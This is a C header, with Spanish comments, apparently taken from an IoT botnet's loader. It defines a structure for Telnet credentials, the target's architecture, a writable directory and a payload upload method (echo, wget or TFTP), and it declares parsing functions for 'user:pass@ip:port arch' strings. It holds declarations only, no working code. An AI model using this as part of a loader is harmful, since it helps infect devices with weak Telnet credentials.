/**************************************************************************
 * Archivo: telnet_info.h
 * 
 * Descripción: Definiciones y estructuras para el manejo de conexiones Telnet.
 * Este módulo proporciona:
 * - Estructura para almacenar información de sesiones Telnet
 * - Funciones para crear y parsear información de conexión
 * - Gestión de credenciales y métodos de carga
 * 
 * El código es fundamental para el proceso de autenticación y carga
 * de payloads en sistemas objetivo a través de Telnet.
 **************************************************************************/

#pragma once

#include "includes.h"    /* Definiciones comunes del proyecto */

/**
 * Estructura que almacena información de una conexión Telnet
 * 
 * Esta estructura mantiene toda la información necesaria para:
 * - Autenticación en el sistema objetivo
 * - Identificación de la arquitectura
 * - Métodos de carga del payload
 * - Ubicación de archivos temporales
 * 
 * Los campos tienen tamaños fijos para prevenir desbordamientos
 * y garantizar compatibilidad con sistemas embebidos.
 */
struct telnet_info {
    char user[32];      /* Nombre de usuario para autenticación */
    char pass[32];      /* Contraseña para autenticación */
    char arch[6];       /* Arquitectura del sistema (arm, mips, x86, etc.) */
    char writedir[32];  /* Directorio con permisos de escritura */
    
    ipv4_t addr;        /* Dirección IPv4 del objetivo */
    port_t port;        /* Puerto del servicio Telnet */
    
    /* Método de carga seleccionado para el payload */
    enum {
        UPLOAD_ECHO,    /* Carga usando comando echo */
        UPLOAD_WGET,    /* Carga usando wget */
        UPLOAD_TFTP     /* Carga usando TFTP */
    } upload_method;
    
    BOOL has_auth;      /* Indica si las credenciales son válidas */
    BOOL has_arch;      /* Indica si se detectó la arquitectura */
};

/**
 * Crea una nueva instancia de información Telnet
 * 
 * Esta función inicializa una estructura telnet_info con los datos
 * proporcionados. Es responsable de:
 * - Validar y copiar credenciales de forma segura
 * - Establecer información de conexión
 * - Inicializar estados y banderas
 * 
 * @param user  Nombre de usuario para autenticación
 * @param pass  Contraseña para autenticación
 * @param arch  Arquitectura del sistema objetivo
 * @param addr  Dirección IPv4 del objetivo
 * @param port  Puerto del servicio Telnet
 * @param info  Estructura a inicializar (puede ser NULL)
 * @return      Puntero a la estructura inicializada o NULL si falla
 */
struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, 
                                   ipv4_t addr, port_t port, 
                                   struct telnet_info *info);

/**
 * Parsea una cadena para extraer información Telnet
 * 
 * Esta función analiza una cadena con formato específico para
 * extraer información de conexión Telnet. La cadena debe seguir
 * el formato: "usuario:contraseña@ip:puerto arch"
 * 
 * Ejemplo: "admin:password@192.168.1.1:23 arm"
 * 
 * @param str  Cadena a parsear con el formato especificado
 * @param out  Estructura donde almacenar la información
 * @return     Puntero a la estructura rellenada o NULL si falla
 */
struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out);
